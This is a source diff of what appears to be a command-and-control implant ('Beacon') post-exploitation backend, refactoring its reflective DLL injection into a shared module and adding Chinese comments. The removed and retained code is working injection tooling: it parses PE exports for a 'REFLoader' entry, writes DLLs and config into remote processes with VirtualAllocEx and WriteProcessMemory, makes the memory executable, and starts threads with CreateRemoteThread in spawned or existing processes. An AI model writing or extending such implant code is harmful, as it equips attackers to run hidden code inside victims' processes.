@@ -1,5 +1,7 @@
 #include "beacon_postex_backend.h"
+#include "beacon_inject.h"
 
+/* 读取远程 PostExConfig，判断远程模块是否已经完成或被取消。 */
 BOOL PostExRemoteCompleted(PostExJob* job)
 {
     PostExConfig snapshot;
@@ -21,6 +23,7 @@ BOOL PostExRemoteCompleted(PostExJob* job)
             snapshot.stage == POSTEX_STAGE_CANCELLED);
 }
 
+/* 构造 PostEx spawn 命令行，保留 exe 路径引号以兼容空格路径。 */
 BOOL PostExBuildSpawnCommandLine(const CHAR* exe_path, const CHAR* args,
                                  CHAR* out, SIZE_T out_size)
 {
@@ -33,6 +36,7 @@ BOOL PostExBuildSpawnCommandLine(const CHAR* exe_path, const CHAR* args,
                        "\"%s\"", exe_path) > 0;
 }
 
+/* 初始化传给远程 PostEx 模块的配置块。 */
 VOID PostExFillConfig(PostExConfig* config, const WCHAR* pipe_name,
                       const CHAR* args)
 {
@@ -49,6 +53,7 @@ VOID PostExFillConfig(PostExConfig* config, const WCHAR* pipe_name,
     }
 }
 
+/* 格式化远程线程状态，用于 job/status 输出和失败诊断。 */
 VOID PostExFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size)
 {
     DWORD wait_rc;
@@ -84,6 +89,7 @@ VOID PostExFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size)
                 (unsigned long)GetLastError());
 }
 
+/* 格式化远程配置块状态，便于判断远程模块卡在哪个阶段。 */
 VOID PostExFormatRemoteConfigStatus(HANDLE process, PVOID remote_config,
                                     CHAR* out, SIZE_T out_size)
 {
@@ -122,101 +128,16 @@ VOID PostExFormatRemoteConfigStatus(HANDLE process, PVOID remote_config,
                 (unsigned long)snapshot.cancel_reason);
 }
 
-static BOOL PostExRvaToRaw(PIMAGE_NT_HEADERS nt, PIMAGE_SECTION_HEADER sections,
-                           DWORD rva, SIZE_T image_size, DWORD* raw)
-{
-    WORD i;
-
-    if (!nt || !sections || !raw) return FALSE;
-    if (rva < nt->OptionalHeader.SizeOfHeaders && rva < image_size) {
-        *raw = rva;
-        return TRUE;
-    }
-
-    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
-        DWORD va = sections[i].VirtualAddress;
-        DWORD size = sections[i].Misc.VirtualSize > sections[i].SizeOfRawData ?
-                     sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
-        if (size == 0) continue;
-        if (rva >= va && rva < va + size) {
-            DWORD off = sections[i].PointerToRawData + (rva - va);
-            if (off < image_size) {
-                *raw = off;
-                return TRUE;
-            }
-            return FALSE;
-        }
-    }
-    return FALSE;
-}
-
-static const CHAR* PostExMachineName(WORD machine)
-{
-    if (machine == IMAGE_FILE_MACHINE_AMD64) return "x64";
-    if (machine == IMAGE_FILE_MACHINE_I386) return "x86";
-    return "unknown";
-}
-
-static WORD PostExBeaconMachine(VOID)
-{
-#if defined(_M_X64) || defined(_M_AMD64)
-    return IMAGE_FILE_MACHINE_AMD64;
-#elif defined(_M_IX86)
-    return IMAGE_FILE_MACHINE_I386;
-#else
-    return 0;
-#endif
-}
-
-static BOOL PostExGetDllMachine(const ByteBuf* dll,
-                                WORD* machine,
-                                CHAR* err,
-                                SIZE_T err_size)
-{
-    PIMAGE_DOS_HEADER dos;
-    PIMAGE_NT_HEADERS nt;
-
-    if (machine) *machine = 0;
-    if (!dll || !dll->data || dll->len < sizeof(IMAGE_DOS_HEADER) || !machine) {
-        if (err) strcpy_s(err, err_size, "invalid postex dll image");
-        return FALSE;
-    }
-
-    dos = (PIMAGE_DOS_HEADER)dll->data;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
-        dos->e_lfanew <= 0 ||
-        (SIZE_T)dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) > dll->len) {
-        if (err) strcpy_s(err, err_size, "invalid postex dll PE header");
-        return FALSE;
-    }
-
-    nt = (PIMAGE_NT_HEADERS)(dll->data + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) {
-        if (err) strcpy_s(err, err_size, "invalid postex dll NT header");
-        return FALSE;
-    }
-
-    *machine = nt->FileHeader.Machine;
-    if (*machine != IMAGE_FILE_MACHINE_AMD64 &&
-        *machine != IMAGE_FILE_MACHINE_I386) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "unsupported postex dll machine: 0x%04x",
-                             (unsigned int)*machine);
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
+/* 校验 PostEx DLL 与当前 Beacon 架构一致。 */
 static BOOL PostExValidateDllMachineForBeacon(const ByteBuf* dll,
-                                              WORD* dll_machine,
-                                              CHAR* err,
-                                              SIZE_T err_size)
+                                               WORD* dll_machine,
+                                               CHAR* err,
+                                               SIZE_T err_size)
 {
     WORD machine = 0;
-    WORD beacon_machine = PostExBeaconMachine();
+    WORD beacon_machine = InjectCurrentMachine();
 
-    if (!PostExGetDllMachine(dll, &machine, err, err_size)) {
+    if (!InjectImageMachine(dll, "postex dll", &machine, err, err_size)) {
         return FALSE;
     }
 
@@ -224,178 +145,38 @@ static BOOL PostExValidateDllMachineForBeacon(const ByteBuf* dll,
     if (!beacon_machine || machine != beacon_machine) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "postex arch mismatch: beacon=%s dll=%s",
-                             PostExMachineName(beacon_machine),
-                             PostExMachineName(machine));
+                             InjectMachineName(beacon_machine),
+                             InjectMachineName(machine));
         return FALSE;
     }
 
     return TRUE;
 }
 
-static BOOL PostExGetProcessMachine(HANDLE process,
-                                    WORD* machine,
-                                    CHAR* err,
-                                    SIZE_T err_size)
-{
-    SYSTEM_INFO native_info;
-    BOOL is_wow64 = FALSE;
-
-    if (machine) *machine = 0;
-    if (!process || !machine) {
-        if (err) strcpy_s(err, err_size, "invalid postex target process");
-        return FALSE;
-    }
-
-    ZeroMemory(&native_info, sizeof(native_info));
-    GetNativeSystemInfo(&native_info);
-    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
-        *machine = IMAGE_FILE_MACHINE_I386;
-        return TRUE;
-    }
-
-    if (!IsWow64Process(process, &is_wow64)) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "postex target arch query failed: %lu",
-                             (unsigned long)GetLastError());
-        return FALSE;
-    }
-
-    if (is_wow64) {
-        *machine = IMAGE_FILE_MACHINE_I386;
-        return TRUE;
-    }
-    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
-        *machine = IMAGE_FILE_MACHINE_AMD64;
-        return TRUE;
-    }
-
-    if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                         "unsupported postex target architecture: %u",
-                         (unsigned int)native_info.wProcessorArchitecture);
-    return FALSE;
-}
-
+/* 校验目标进程架构与 PostEx DLL 架构一致。 */
 static BOOL PostExValidateTargetMachine(HANDLE process,
-                                        WORD dll_machine,
-                                        CHAR* err,
+                                         WORD dll_machine,
+                                         CHAR* err,
                                         SIZE_T err_size)
 {
     WORD target_machine = 0;
 
-    if (!PostExGetProcessMachine(process, &target_machine, err, err_size)) {
+    if (!InjectGetProcessMachine(process, "postex target",
+                                 &target_machine, err, err_size)) {
         return FALSE;
     }
     if (target_machine != dll_machine) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "postex arch mismatch: dll=%s target=%s",
-                             PostExMachineName(dll_machine),
-                             PostExMachineName(target_machine));
+                             InjectMachineName(dll_machine),
+                             InjectMachineName(target_machine));
         return FALSE;
     }
 
     return TRUE;
 }
 
-static BOOL PostExFindExportRawOffset(const BYTE8* image, SIZE_T image_size,
-                                      const CHAR* export_name, DWORD* raw_offset)
-{
-    PIMAGE_DOS_HEADER dos;
-    PIMAGE_NT_HEADERS nt;
-    PIMAGE_SECTION_HEADER sections;
-    IMAGE_DATA_DIRECTORY* dir;
-    PIMAGE_EXPORT_DIRECTORY exports;
-    DWORD export_raw;
-    DWORD names_raw;
-    DWORD ordinals_raw;
-    DWORD functions_raw;
-    DWORD* names;
-    WORD* ordinals;
-    DWORD* functions;
-    DWORD i;
-
-    if (!image || image_size < sizeof(IMAGE_DOS_HEADER) || !export_name || !raw_offset) {
-        return FALSE;
-    }
-
-    dos = (PIMAGE_DOS_HEADER)image;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
-        dos->e_lfanew <= 0 ||
-        (SIZE_T)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > image_size) {
-        return FALSE;
-    }
-
-    nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
-
-#if defined(_M_X64) || defined(_M_AMD64)
-    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return FALSE;
-#elif defined(_M_IX86)
-    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) return FALSE;
-#endif
-
-    if (nt->FileHeader.NumberOfSections == 0 ||
-        (SIZE_T)dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
-        nt->FileHeader.SizeOfOptionalHeader +
-        ((SIZE_T)nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)) > image_size) {
-        return FALSE;
-    }
-
-    sections = IMAGE_FIRST_SECTION(nt);
-    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    if (!dir->VirtualAddress || !dir->Size) return FALSE;
-
-    if (!PostExRvaToRaw(nt, sections, dir->VirtualAddress, image_size, &export_raw) ||
-        export_raw + sizeof(IMAGE_EXPORT_DIRECTORY) > image_size) {
-        return FALSE;
-    }
-
-    exports = (PIMAGE_EXPORT_DIRECTORY)(image + export_raw);
-    if (!exports->NumberOfNames || !exports->AddressOfNames ||
-        !exports->AddressOfNameOrdinals || !exports->AddressOfFunctions) {
-        return FALSE;
-    }
-
-    if (!PostExRvaToRaw(nt, sections, exports->AddressOfNames, image_size, &names_raw) ||
-        !PostExRvaToRaw(nt, sections, exports->AddressOfNameOrdinals, image_size, &ordinals_raw) ||
-        !PostExRvaToRaw(nt, sections, exports->AddressOfFunctions, image_size, &functions_raw)) {
-        return FALSE;
-    }
-
-    if (names_raw + exports->NumberOfNames * sizeof(DWORD) > image_size ||
-        ordinals_raw + exports->NumberOfNames * sizeof(WORD) > image_size ||
-        functions_raw + exports->NumberOfFunctions * sizeof(DWORD) > image_size) {
-        return FALSE;
-    }
-
-    names = (DWORD*)(image + names_raw);
-    ordinals = (WORD*)(image + ordinals_raw);
-    functions = (DWORD*)(image + functions_raw);
-
-    for (i = 0; i < exports->NumberOfNames; ++i) {
-        DWORD name_raw;
-        WORD ord;
-        DWORD func_rva;
-
-        if (!PostExRvaToRaw(nt, sections, names[i], image_size, &name_raw) ||
-            name_raw >= image_size) {
-            continue;
-        }
-        if (strcmp((const CHAR*)(image + name_raw), export_name) != 0) {
-            continue;
-        }
-
-        ord = ordinals[i];
-        if (ord >= exports->NumberOfFunctions) return FALSE;
-        func_rva = functions[ord];
-        if (!PostExRvaToRaw(nt, sections, func_rva, image_size, raw_offset)) {
-            return FALSE;
-        }
-        return *raw_offset < image_size;
-    }
-
-    return FALSE;
-}
-
+/* 准备远程 reflective DLL 和 PostExConfig，返回远程入口与资源地址。 */
 BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
                                    const PostExConfig* config,
                                    PVOID* remote_image,
@@ -404,11 +185,8 @@ BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
                                    PVOID* remote_entry,
                                    CHAR* err, SIZE_T err_size)
 {
-    DWORD loader_raw = 0;
-    PBYTE image = NULL;
-    PVOID cfg = NULL;
-    SIZE_T wrote = 0;
-    DWORD old_protect = 0;
+    InjectRequest req;
+    InjectResult result;
 
     if (remote_image) *remote_image = NULL;
     if (remote_image_size) *remote_image_size = 0;
@@ -421,162 +199,49 @@ BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
         if (err) strcpy_s(err, err_size, "invalid remote reflective request");
         return FALSE;
     }
-    if (!PostExFindExportRawOffset(dll->data, dll->len, "REFLoader", &loader_raw)) {
-        if (err) strcpy_s(err, err_size, "reflective DLL missing REFLoader export");
-        return FALSE;
-    }
 
-    image = (PBYTE)VirtualAllocEx(process, NULL, dll->len,
-                                  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    if (!image) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "VirtualAllocEx(image) failed: %lu",
-                             (unsigned long)GetLastError());
-        return FALSE;
-    }
-    if (!WriteProcessMemory(process, image, dll->data, dll->len, &wrote) ||
-        wrote != dll->len) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "WriteProcessMemory(image) failed: %lu",
-                             (unsigned long)GetLastError());
-        VirtualFreeEx(process, image, 0, MEM_RELEASE);
-        return FALSE;
-    }
-    if (!VirtualProtectEx(process, image, dll->len, PAGE_EXECUTE_READWRITE, &old_protect)) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "VirtualProtectEx(image) failed: %lu",
-                             (unsigned long)GetLastError());
-        VirtualFreeEx(process, image, 0, MEM_RELEASE);
-        return FALSE;
-    }
-    FlushInstructionCache(process, image, dll->len);
+    ZeroMemory(&req, sizeof(req));
+    InjectResultInit(&result);
+    req.method = INJECT_METHOD_REFLECTIVE;
+    req.process = process;
+    req.image = dll;
+    req.parameter = config;
+    req.parameter_size = sizeof(*config);
+    req.entry_export = "REFLoader";
+    req.required_machine = InjectCurrentMachine();
+    req.image_label = "image";
+    req.parameter_label = "config";
+    req.invalid_request_error = "invalid remote reflective request";
+    req.missing_export_error = "reflective DLL missing REFLoader export";
+    if (!InjectPrepare(&req, &result, err, err_size)) return FALSE;
 
-    cfg = VirtualAllocEx(process, NULL, sizeof(*config),
-                         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    if (!cfg) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "VirtualAllocEx(config) failed: %lu",
-                             (unsigned long)GetLastError());
-        VirtualFreeEx(process, image, 0, MEM_RELEASE);
-        return FALSE;
-    }
-    if (!WriteProcessMemory(process, cfg, config, sizeof(*config), &wrote) ||
-        wrote != sizeof(*config)) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "WriteProcessMemory(config) failed: %lu",
-                             (unsigned long)GetLastError());
-        VirtualFreeEx(process, cfg, 0, MEM_RELEASE);
-        VirtualFreeEx(process, image, 0, MEM_RELEASE);
-        return FALSE;
-    }
-
-    *remote_image = image;
-    if (remote_image_size) *remote_image_size = dll->len;
-    *remote_config = cfg;
-    *remote_entry = image + loader_raw;
+    *remote_image = result.remote_image;
+    if (remote_image_size) *remote_image_size = result.remote_image_size;
+    *remote_config = result.remote_parameter;
+    *remote_entry = result.remote_entry;
     return TRUE;
 }
 
-static BOOL PostExRemoteProcessAlive(HANDLE process,
-                                     CHAR* status,
-                                     SIZE_T status_size)
-{
-    DWORD wait_rc;
-    DWORD exit_code = 0;
-
-    if (status && status_size) {
-        status[0] = '\0';
-    }
-    if (!process) {
-        if (status) strcpy_s(status, status_size, "process=null");
-        return FALSE;
-    }
-
-    wait_rc = WaitForSingleObject(process, 0);
-    if (wait_rc == WAIT_TIMEOUT) {
-        if (status) strcpy_s(status, status_size, "process=running");
-        return TRUE;
-    }
-    if (wait_rc == WAIT_OBJECT_0) {
-        if (GetExitCodeProcess(process, &exit_code)) {
-            if (status) _snprintf_s(status, status_size, _TRUNCATE,
-                                    "process=exited:0x%08lx",
-                                    (unsigned long)exit_code);
-        } else if (status) {
-            _snprintf_s(status, status_size, _TRUNCATE,
-                        "process=exited:GetExitCodeProcess failed:%lu",
-                        (unsigned long)GetLastError());
-        }
-        return FALSE;
-    }
-
-    if (status) _snprintf_s(status, status_size, _TRUNCATE,
-                            "process=wait_failed:%lu",
-                            (unsigned long)GetLastError());
-    return FALSE;
-}
-
+/* 启动 reflective DLL 入口线程，参数为远程 PostExConfig 地址。 */
 BOOL PostExCreateRemoteReflectiveThread(HANDLE process,
                                         PVOID remote_entry,
                                         PVOID remote_config,
                                         HANDLE* remote_thread,
                                         CHAR* err, SIZE_T err_size)
 {
-    HANDLE thread = NULL;
-    DWORD last_error = 0;
-    INT attempt;
-
-    if (remote_thread) *remote_thread = NULL;
-    if (err && err_size) err[0] = '\0';
-
-    if (!process || !remote_entry || !remote_config || !remote_thread) {
+    if (!remote_config) {
+        if (remote_thread) *remote_thread = NULL;
+        if (err && err_size) err[0] = '\0';
         if (err) strcpy_s(err, err_size, "invalid remote reflective entry");
         return FALSE;
     }
-
-    for (attempt = 0; attempt < 5; ++attempt) {
-        CHAR process_status[96];
-
-        if (!PostExRemoteProcessAlive(process, process_status,
-                                      sizeof(process_status))) {
-            if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                                 "CreateRemoteThread skipped: %s",
-                                 process_status);
-            return FALSE;
-        }
-
-        thread = CreateRemoteThread(process, NULL, 0,
-                                    (LPTHREAD_START_ROUTINE)remote_entry,
-                                    remote_config, 0, NULL);
-        if (thread) {
-            *remote_thread = thread;
-            return TRUE;
-        }
-
-        last_error = GetLastError();
-        if (last_error != ERROR_ACCESS_DENIED) {
-            if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                                 "CreateRemoteThread failed: %lu (%s)",
-                                 (unsigned long)last_error,
-                                 process_status);
-            return FALSE;
-        }
-        Sleep(150);
-    }
-
-    if (!thread) {
-        CHAR process_status[96];
-        PostExRemoteProcessAlive(process, process_status, sizeof(process_status));
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "CreateRemoteThread failed: %lu (%s)",
-                             (unsigned long)last_error,
-                             process_status);
-        return FALSE;
-    }
-
-    return FALSE;
+    return InjectCreateRemoteThread(process, remote_entry, remote_config,
+                                    5, 150,
+                                    "invalid remote reflective entry",
+                                    remote_thread, err, err_size);
 }
 
+/* 完成 reflective DLL 的准备与启动，并在启动失败时回滚远程内存。 */
 BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
                                  const PostExConfig* config,
                                  PVOID* remote_image,
@@ -596,8 +261,13 @@ BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
 
     if (!PostExCreateRemoteReflectiveThread(process, remote_entry, *remote_config,
                                             remote_thread, err, err_size)) {
-        VirtualFreeEx(process, *remote_config, 0, MEM_RELEASE);
-        VirtualFreeEx(process, *remote_image, 0, MEM_RELEASE);
+        InjectResult cleanup_remote;
+        InjectResultInit(&cleanup_remote);
+        cleanup_remote.remote_image = *remote_image;
+        cleanup_remote.remote_image_size = remote_image_size ? *remote_image_size : 0;
+        cleanup_remote.remote_parameter = *remote_config;
+        cleanup_remote.remote_parameter_size = sizeof(*config);
+        InjectFreeRemote(process, &cleanup_remote);
         *remote_config = NULL;
         *remote_image = NULL;
         if (remote_image_size) *remote_image_size = 0;
@@ -607,6 +277,7 @@ BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
     return TRUE;
 }
 
+/* PostEx spawn：创建挂起进程、写入 DLL/config、恢复进程并启动远程线程。 */
 BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
                             HANDLE* process,
                             HANDLE* remote_thread,
@@ -647,6 +318,7 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
         return FALSE;
     }
 
+    /* PostEx 需要 pipe 名写入远程配置，因此准备 DLL 前先完成字符串转换。 */
     command_line_w = Utf8ToWide(command_line);
     pipe_name_w = Utf8ToWide(req->pipe_name);
     if (!command_line_w || !pipe_name_w) {
@@ -659,6 +331,7 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
     PostExFillConfig(&config, pipe_name_w, req->module_args);
     config.flags |= POSTEX_CONFIG_FLAG_REMOTE;
 
+    /* 先挂起宿主，完成远程 DLL/config 写入后再恢复主线程。 */
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);
@@ -693,6 +366,7 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
         return FALSE;
     }
 
+    /* 恢复宿主后再创建远程线程，避免目标仍处于过早初始化状态。 */
     ResumeThread(pi.hThread);
     WaitForInputIdle(pi.hProcess, 1000);
     CloseHandle(pi.hThread);
@@ -700,8 +374,13 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
 
     if (!PostExCreateRemoteReflectiveThread(pi.hProcess, remote_entry, *remote_config,
                                             remote_thread, err, err_size)) {
-        VirtualFreeEx(pi.hProcess, *remote_config, 0, MEM_RELEASE);
-        VirtualFreeEx(pi.hProcess, *remote_image, 0, MEM_RELEASE);
+        InjectResult cleanup_remote;
+        InjectResultInit(&cleanup_remote);
+        cleanup_remote.remote_image = *remote_image;
+        cleanup_remote.remote_image_size = remote_image_size;
+        cleanup_remote.remote_parameter = *remote_config;
+        cleanup_remote.remote_parameter_size = sizeof(config);
+        InjectFreeRemote(pi.hProcess, &cleanup_remote);
         *remote_config = NULL;
         *remote_image = NULL;
         TerminateProcess(pi.hProcess, 1);
@@ -718,6 +397,7 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
     return TRUE;
 }
 
+/* PostEx inject：打开既有进程、写入 DLL/config 并启动远程线程。 */
 BOOL PostExStartInjectRemote(const PostExStartRequest* req,
                              HANDLE* process,
                              HANDLE* remote_thread,
@@ -755,6 +435,7 @@ BOOL PostExStartInjectRemote(const PostExStartRequest* req,
     PostExFillConfig(&config, pipe_name_w, req->module_args);
     config.flags |= POSTEX_CONFIG_FLAG_REMOTE;
 
+    /* 既有目标进程不归本 job 所有，失败路径只关闭句柄和释放本次资源。 */
     *process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                            PROCESS_VM_READ | SYNCHRONIZE,
@@ -787,6 +468,7 @@ BOOL PostExStartInjectRemote(const PostExStartRequest* req,
     return TRUE;
 }
 
+/* 清理运行中的 PostEx job；仅在远程模块已完成时释放远程内存。 */
 static VOID PostExRemoteThreadCleanupJob(PostExJob* job, BOOL kill_process)
 {
     BOOL terminate_owned_process;
@@ -809,14 +491,14 @@ static VOID PostExRemoteThreadCleanupJob(PostExJob* job, BOOL kill_process)
                             PostExRemoteCompleted(job);
 
     if (release_remote_memory) {
-        if (job->remote_image) {
-            VirtualFreeEx(job->process, job->remote_image, 0, MEM_RELEASE);
-            job->remote_image = NULL;
-        }
-        if (job->remote_config) {
-            VirtualFreeEx(job->process, job->remote_config, 0, MEM_RELEASE);
-            job->remote_config = NULL;
-        }
+        InjectResult cleanup_remote;
+        InjectResultInit(&cleanup_remote);
+        cleanup_remote.remote_image = job->remote_image;
+        cleanup_remote.remote_parameter = job->remote_config;
+        cleanup_remote.remote_parameter_size = sizeof(PostExConfig);
+        InjectFreeRemote(job->process, &cleanup_remote);
+        job->remote_image = NULL;
+        job->remote_config = NULL;
     }
 
     if (terminate_owned_process) {
@@ -826,6 +508,7 @@ static VOID PostExRemoteThreadCleanupJob(PostExJob* job, BOOL kill_process)
     job->process = NULL;
 }
 
+/* 清理启动阶段的临时结果，主要用于启动失败后的回滚。 */
 static VOID PostExRemoteThreadCleanupStartResult(const PostExStartRequest* req,
                                                  PostExStartResult* result)
 {
@@ -836,14 +519,14 @@ static VOID PostExRemoteThreadCleanupStartResult(const PostExStartRequest* req,
         result->remote_thread = NULL;
     }
     if (result->process) {
-        if (result->remote_config) {
-            VirtualFreeEx(result->process, result->remote_config, 0, MEM_RELEASE);
-            result->remote_config = NULL;
-        }
-        if (result->remote_image) {
-            VirtualFreeEx(result->process, result->remote_image, 0, MEM_RELEASE);
-            result->remote_image = NULL;
-        }
+        InjectResult cleanup_remote;
+        InjectResultInit(&cleanup_remote);
+        cleanup_remote.remote_image = result->remote_image;
+        cleanup_remote.remote_parameter = result->remote_config;
+        cleanup_remote.remote_parameter_size = sizeof(PostExConfig);
+        InjectFreeRemote(result->process, &cleanup_remote);
+        result->remote_image = NULL;
+        result->remote_config = NULL;
         if (req && result->owns_process &&
             WaitForSingleObject(result->process, 0) != WAIT_OBJECT_0) {
             TerminateProcess(result->process, 1);
@@ -854,6 +537,7 @@ static VOID PostExRemoteThreadCleanupStartResult(const PostExStartRequest* req,
     PostExStartResultInit(result);
 }
 
+/* 通过远程 PostExConfig 设置取消标志，由远程模块协作式退出。 */
 static BOOL PostExRemoteThreadCancelJob(PostExJob* job, UINT32 reason)
 {
     DWORD flags = 0;
@@ -892,6 +576,7 @@ static BOOL PostExRemoteThreadCancelJob(PostExJob* job, UINT32 reason)
     return TRUE;
 }
 
+/* 初始化 PostEx 后端启动结果结构。 */
 VOID PostExStartResultInit(PostExStartResult* result)
 {
     if (result) {
@@ -899,6 +584,7 @@ VOID PostExStartResultInit(PostExStartResult* result)
     }
 }
 
+/* remote-thread 后端入口：按 PostEx 子命令选择 spawn 或 inject。 */
 static BOOL PostExRemoteThreadStart(const PostExStartRequest* req,
                                     PostExStartResult* result,
                                     CHAR* err,
@@ -934,6 +620,7 @@ static BOOL PostExRemoteThreadStart(const PostExStartRequest* req,
     return FALSE;
 }
 
+/* PostEx 后端注册表；当前保留既有 backend name 字段，不在本次改动扩大行为面。 */
 static const PostExBackendOps g_postex_backends[] = {
     {
         POSTEX_BACKEND_REMOTE_THREAD,
@@ -946,6 +633,7 @@ static const PostExBackendOps g_postex_backends[] = {
     }
 };
 
+/* 按 kind 查找 PostEx 后端，kind 为 0 时走默认 remote-thread 后端。 */
 const PostExBackendOps* PostExBackendFind(UINT32 kind)
 {
     SIZE_T i;
@@ -961,6 +649,7 @@ const PostExBackendOps* PostExBackendFind(UINT32 kind)
     return NULL;
 }
 
+/* 调用后端专属启动失败清理逻辑。 */
 VOID PostExBackendCleanupStartResult(const PostExStartRequest* req,
                                      PostExStartResult* result)
 {
@@ -975,6 +664,7 @@ VOID PostExBackendCleanupStartResult(const PostExStartRequest* req,
     PostExStartResultInit(result);
 }
 
+/* 调用后端专属 job 清理逻辑。 */
 VOID PostExBackendCleanupJob(PostExJob* job, BOOL kill_process)
 {
     const PostExBackendOps* backend;
@@ -986,6 +676,7 @@ VOID PostExBackendCleanupJob(PostExJob* job, BOOL kill_process)
     }
 }
 
+/* 调用后端专属取消逻辑。 */
 BOOL PostExBackendCancelJob(PostExJob* job, UINT32 reason)
 {
     const PostExBackendOps* backend;
@@ -998,6 +689,7 @@ BOOL PostExBackendCancelJob(PostExJob* job, UINT32 reason)
     return FALSE;
 }
 
+/* PostEx 后端统一启动入口，负责默认后端选择和分发表调用。 */
 BOOL PostExStartRemote(const PostExStartRequest* req,
                        PostExStartResult* result,
                        CHAR* err,
